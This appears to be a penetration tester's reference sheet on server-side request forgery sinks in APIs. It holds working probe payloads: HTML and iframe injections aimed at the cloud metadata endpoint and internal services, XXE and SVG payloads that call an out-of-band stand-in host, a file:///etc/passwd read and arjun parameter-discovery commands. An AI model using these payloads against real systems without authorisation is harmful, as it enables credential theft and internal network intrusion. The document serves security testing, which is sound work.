# SSRF sinks in APIs — where to look and what the request looks like

Any server-side code path that takes a URL, hostname, IP, port, or file
reference from the client and dereferences it. Grouped by feature class, with
typical request shapes and probing notes.

## Webhooks / callbacks (usually blind)

```
POST /v1/webhooks HTTP/1.1
{"url":"https://hooks.example.com/x","events":["order.paid"]}
```

- Creation endpoints, "test webhook" / "ping" buttons (immediate fetch — best
  probe target), event-subscription APIs, payment IPN/notify URLs, Slack-style
  outgoing integrations, CI/CD build-status callbacks.
- Fetch is often async/queued — leave the OOB listener running; hits can land
  minutes later. Correlate by unique token subdomain, not by timing.
- Some validate with a GET challenge first — that validation fetch is itself
  the SSRF.

## Import / fetch-by-URL (often readable)

- "Import from URL": CSV/JSON/OPML import, data-source connectors, package
  registry mirrors.
- Avatar / image from URL: `{"avatar_url":"..."}` — server downloads and
  re-serves or thumbnails it. Fetch 169.254.169.254, then download your own
  avatar: the stored object may contain the metadata response.
- Link preview / URL unfurl endpoints: `POST /v1/unfurl {"url":"..."}` —
  response includes title/og:tags scraped from the fetched page → readable.
- RSS/Atom feed readers, calendar (ICS) subscriptions, remote config loaders.

## Renderers (HTML→PDF, screenshots, thumbnails)

```
POST /v1/render/pdf HTTP/1.1
{"html":"<h1>invoice</h1>","footer_url":"..."}
```

- If you control a URL param, use it directly. If you control HTML/markdown,
  inject fetch primitives:
  - `<img src="http://169.254.169.254/latest/meta-data/">` (blind unless the
    renderer errors reveal content)
  - `<iframe src="http://127.0.0.1:8500/v1/kv/?recurse">` — content appears in
    the rendered PDF/screenshot → **readable**.
  - `<link rel="stylesheet" href="http://TOKEN.oob.example.net/">`,
    `<base href=...>`, CSS `url()`, `<object data=...>`, `<embed>`.
  - wkhtmltopdf historically honored `file:///etc/passwd` in iframes.
- Headless-Chrome renderers follow redirects and run JS — a page on your host
  can `fetch()` internal URLs and exfiltrate to you.

## SSO / OIDC / OAuth / SAML

- OIDC dynamic client registration: `jwks_uri`, `sector_identifier_uri`,
  `request_uris`, `logo_uri` are all server-fetched.
- OIDC discovery: anything accepting an `issuer` URL fetches
  `<issuer>/.well-known/openid-configuration`.
- `request_uri` parameter on the authorize endpoint (fetched at auth time).
- SAML metadata import by URL; XML signature `Reference URI`.
- `redirect_uri` is normally client-side (open redirect), **but** some servers
  pre-validate it with a server-side fetch — test with OOB anyway.

## Proxy / gateway / infra params

- Generic proxies: `/proxy?url=`, `/fetch?target=`, `/api/v1/get?u=`.
- Monitoring "check this host" endpoints: `{"host":"...","port":443}` —
  host+port split params are port-scan oracles by design.
- Gateway/admin APIs configuring upstreams, health checks, mirrors.
- `Host` header and `X-Forwarded-Host` on apps that build internal URLs from
  them (password-reset links, internal callbacks).

## File-format sinks (no URL param needed)

- **XXE → SSRF**: any XML body/upload (SOAP, SAML, DOCX/XLSX, SVG):
  ```xml
  <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://TOKEN.oob.example.net/">]><r>&x;</r>
  ```
  Parameter entities for blind: `<!ENTITY % x SYSTEM "http://TOKEN.oob.example.net/">%x;`
- **SVG**: `<svg xmlns="..."><image href="http://TOKEN.oob.example.net/"/></svg>`
  via avatar/logo upload that rasterizes server-side.
- **PDF generators** fed user markdown/HTML (see renderers).
- Office docs with remote template/external relationship URLs, M3U/playlist
  parsers, EXIF-driven fetches.

## Parameter-name hunting

Grep specs/traffic (case-insensitive, also inside nested JSON and arrays):

```
url uri callback callback_url webhook webhook_url notify notify_url dest
destination redirect redirect_uri return return_url next target feed host
hostname port path file filename src source href link site domain proxy
fetch endpoint upstream image image_url avatar logo icon preview template
reference data remote import export mirror repo registry
```

Hidden params with arjun (JSON output for parsing):

```
arjun -u https://api.example.com/v1/preview -m GET -oJ reports/arjun.json
arjun -u https://api.example.com/v1/import -m POST -oJ reports/arjun-post.json
arjun -u https://api.example.com/v1/import -m JSON --include '{"auth":"..."}' -oJ reports/arjun-json.json
# add -H 'Authorization: Bearer ...' for authed endpoints, -w <wordlist> for custom lists
```

Any discovered param matching the list above is a probe candidate — add it to
the template set and mark the endpoint `mapped`.
